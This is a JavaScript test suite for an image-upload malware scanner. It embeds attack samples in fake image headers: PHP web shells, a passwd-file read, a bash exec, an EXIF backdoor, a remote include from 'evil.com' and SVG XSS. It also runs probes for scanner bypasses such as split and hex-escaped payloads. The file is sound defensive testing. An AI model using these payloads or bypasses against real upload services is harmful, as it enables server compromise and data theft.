const path = require('path');
const { scanBufferForMalware, isValidImageSignature } = require('../middleware/image-guard');

function makeJpegHeader() { return Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00]); }
function makePngHeader() { return Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]); }
function makeGifHeader() { return Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]); }
function rnd(n) { const b = Buffer.alloc(n); for(let i=0;i<n;i++) b[i]=Math.floor(Math.random()*256); return b; }

const TC = [
  {id:'TC-01',n:'PHP WebShell in JPEG',mk:()=>Buffer.concat([makeJpegHeader(),rnd(500),Buffer.from('<?php system(_GET["cmd"]); ?>')]),exp:true},
  {id:'TC-02',n:'JS eval() in PNG',mk:()=>Buffer.concat([makePngHeader(),rnd(600),Buffer.from('eval(atob("YWxlcnQ="))')]),exp:true},
  {id:'TC-03',n:'Script tag in GIF',mk:()=>Buffer.concat([makeGifHeader(),rnd(400),Buffer.from('<script>document.cookie</script>')]),exp:true},
  {id:'TC-04',n:'Pure PHP as .jpg (no magic)',mk:()=>Buffer.from('<?php echo "Hacked"; ?>'),exp:true,sig:true},
  {id:'TC-05',n:'Java System.out in JPEG',mk:()=>Buffer.concat([makeJpegHeader(),rnd(800),Buffer.from('System.out.println("pwned")')]),exp:true},
  {id:'TC-06',n:'shell_exec in PNG',mk:()=>Buffer.concat([makePngHeader(),rnd(700),Buffer.from('shell_exec("cat /etc/passwd")')]),exp:true},
  {id:'TC-07',n:'base64_decode in JPEG',mk:()=>Buffer.concat([makeJpegHeader(),rnd(500),Buffer.from('base64_decode("c3lz")')]),exp:true},
  {id:'TC-08',n:'passthru in GIF',mk:()=>Buffer.concat([makeGifHeader(),rnd(500),Buffer.from('passthru("ls -la")')]),exp:true},
  {id:'TC-09',n:'javascript: URI in PNG',mk:()=>Buffer.concat([makePngHeader(),rnd(500),Buffer.from('javascript:alert(1)')]),exp:true},
  {id:'TC-10',n:'exec() in JPEG',mk:()=>Buffer.concat([makeJpegHeader(),rnd(600),Buffer.from('exec("/bin/bash")')]),exp:true},
  {id:'TC-11',n:'Text file as PNG (ASCII ratio)',mk:()=>Buffer.concat([makePngHeader(),Buffer.from('This is text '.repeat(50))]),exp:true},
  {id:'TC-12',n:'Clean JPEG (safe)',mk:()=>Buffer.concat([makeJpegHeader(),rnd(2000)]),exp:false},
  {id:'TC-13',n:'Clean PNG (safe)',mk:()=>Buffer.concat([makePngHeader(),rnd(1500)]),exp:false},
  {id:'TC-14',n:'NULL byte + PHP in JPEG',mk:()=>Buffer.concat([makeJpegHeader(),rnd(500),Buffer.alloc(50,0),Buffer.from('<?php eval(_POST["a"]); ?>')]),exp:true},
  {id:'TC-15',n:'EXIF PHP backdoor',mk:()=>{let h=makeJpegHeader();let m=Buffer.from([0xFF,0xE1]);let p=Buffer.from('<?php system("id"); ?>');let l=Buffer.alloc(2);l.writeUInt16BE(p.length+2,0);return Buffer.concat([h,m,l,p,rnd(600)]);},exp:true},
  {id:'TC-16',n:'Double ext polyglot',mk:()=>Buffer.concat([makeJpegHeader(),rnd(300),Buffer.from('<?php include("http://evil.com"); ?>')]),exp:true},
  {id:'TC-17',n:'SVG XSS (no bitmap magic)',mk:()=>Buffer.from('<svg onload="alert(1)"><circle/></svg>'),exp:true,sig:true},
  {id:'TC-18',n:'Python exec reverse shell in PNG',mk:()=>Buffer.concat([makePngHeader(),rnd(500),Buffer.from('exec("python -c import socket")')]),exp:true},
];

console.log('\n============================================================');
console.log('  IMAGE GUARD SECURITY TEST SUITE - 18 Test Cases');
console.log('  He thong AI Chat - Hoc vien Hang khong Viet Nam');
console.log('============================================================\n');

let pass=0,fail=0,failList=[];
for(const t of TC){
  const buf=t.mk();
  const vs=isValidImageSignature(buf);
  let det=false,rsn='';
  if(t.sig){det=!vs;rsn=det?'Blocked: Invalid Magic Bytes':'NOT blocked at signature!';}
  else{if(!vs){det=true;rsn='Blocked: Magic Bytes';}else{const r=scanBufferForMalware(buf);det=!r.isSafe;rsn=r.reason;}}
  const ok=(det===t.exp);
  if(ok){pass++;console.log('  [PASS] '+t.id+': '+t.n);console.log('         -> '+(det?'BLOCKED':'ALLOWED (safe)')+' | '+rsn);}
  else{fail++;failList.push(t);console.log('  [FAIL] '+t.id+': '+t.n);console.log('         Expected: '+(t.exp?'BLOCK':'ALLOW')+' | Got: '+(det?'BLOCK':'ALLOW')+' | '+rsn);}
  console.log('  ----------------------------------------------------------------');
}

console.log('\n============================================================');
console.log('  RESULTS: '+pass+'/'+TC.length+' PASSED, '+fail+' FAILED ('+Math.round(pass/TC.length*100)+'%)');
console.log('============================================================');
if(failList.length){console.log('\n  VULNERABILITIES:');failList.forEach(f=>console.log('  [!] '+f.id+': '+f.n));}

// Deep analysis
console.log('\n============================================================');
console.log('  DEEP CODE ANALYSIS - image-guard.js');
console.log('============================================================\n');

// A1: Regex /g lastIndex bug
console.log('  [A1] Regex lastIndex stateful bug check...');
const tr=/eval\s*\(/gi;const ts='eval("x") eval("y")';const f1=tr.test(ts),f2=tr.test(ts);
console.log(f1&&!f2?'     [WARN] /gi flag causes lastIndex bug on repeated .test()':'     [OK] No issue in single-pass flow');

// A2: Payload at end of large file
console.log('  [A2] Large file tail payload detection...');
const big=Buffer.concat([makePngHeader(),rnd(15000),Buffer.from('<?php system("id"); ?>')]);
const br=scanBufferForMalware(big);
console.log(!br.isSafe?'     [OK] Full buffer regex scan - tail payload detected':'     [CRITICAL] Tail payload NOT detected!');

// A3: WebP support
console.log('  [A3] WebP format support...');
const wb=Buffer.alloc(12);wb.write('RIFF',0);wb.writeUInt32LE(100,4);wb.write('WEBP',8);
console.log(isValidImageSignature(wb)?'     [OK] WebP supported':'     [INFO] WebP not supported (add if needed)');

// A4: BMP/TIFF
console.log('  [A4] BMP/TIFF support check...');
const bmp=isValidImageSignature(Buffer.from([0x42,0x4D,0,0]));
const tif=isValidImageSignature(Buffer.from([0x49,0x49,0x2A,0]));
console.log(!bmp?'     [INFO] BMP not supported (low risk for AI chat)':'     [OK] BMP supported');
console.log(!tif?'     [INFO] TIFF not supported (low risk for AI chat)':'     [OK] TIFF supported');

// A5: Case insensitive
console.log('  [A5] Case sensitivity check...');
const up=Buffer.concat([makeJpegHeader(),rnd(300),Buffer.from('<?PHP SYSTEM("id"); ?>')]);
const ur=scanBufferForMalware(up);
console.log(!ur.isSafe?'     [OK] Case-insensitive matching works':'     [FAIL] Uppercase PHP not detected!');

// A6: Chunked/split payload
console.log('  [A6] Chunked payload bypass check...');
const ch=Buffer.concat([makeJpegHeader(),rnd(200),Buffer.from('<?p'),rnd(50),Buffer.from('hp system("id"); ?>')]);
const cr=scanBufferForMalware(ch);
console.log(cr.isSafe?'     [WARN] Chunked "<?php" bypass works (regex limitation - needs entropy analysis)':'     [OK] Chunked payload still detected');

// A7: Hex escape
console.log('  [A7] Hex-escape obfuscation check...');
const hx=Buffer.concat([makePngHeader(),rnd(200),Buffer.from('\x3C\x3Fphp system("id"); \x3F\x3E')]);
const hr=scanBufferForMalware(hx);
console.log(!hr.isSafe?'     [OK] Hex-escaped <?php detected via binary decode':'     [FAIL] Hex-escape bypass not detected!');

// A8: Multi-pattern
console.log('  [A8] Multi-pattern detection...');
const mp=Buffer.concat([makeJpegHeader(),rnd(200),Buffer.from('eval("x")'),rnd(100),Buffer.from('<?php ?>'),rnd(100),Buffer.from('<script></script>')]);
const mr=scanBufferForMalware(mp);
console.log(!mr.isSafe?'     [OK] Multi-pattern file detected (first match: '+mr.reason+')':'     [FAIL] Multi-pattern file not detected!');

console.log('\n============================================================');
console.log('  ALL TESTS AND ANALYSIS COMPLETE');
console.log('============================================================\n');
